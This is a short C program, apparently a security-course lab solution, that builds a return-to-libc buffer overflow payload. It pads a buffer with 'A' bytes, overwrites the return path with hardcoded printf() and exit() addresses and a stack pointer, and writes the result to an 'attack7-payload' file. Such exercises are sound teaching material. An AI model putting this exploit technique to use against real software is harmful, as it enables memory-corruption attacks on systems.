#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */
    int buffer_length=231;
    char buffer[buffer_length];

    int i=0;
        for (i=0;i< buffer_length-18;i++){
                buffer[i]='A';
        }

//address of printf()
     buffer[213]='\x80';
     buffer[214]='\x16';
     buffer[215]='\xe5';
     buffer[216]='\xb7';
//address of exit()     
     buffer[217]='\xe0';
     buffer[218]='\x69';
     buffer[219]='\xe3';
     buffer[220]='\xb7';
// address of "Ayush\0" on stack
         
     buffer[221]='\xb8';
     buffer[222]='\xef';
     buffer[223]='\xff';
     buffer[224]='\xbf';

// "Ayush\0"
     buffer[225]='A';
     buffer[226]='y';
     buffer[227]='u';
     buffer[228]='s';
     buffer[229]='h';
     buffer[230]='\0';



    write_to_file( "attack7-payload", buffer , buffer_length , FILE_CLEAR );
    exit(0);
}
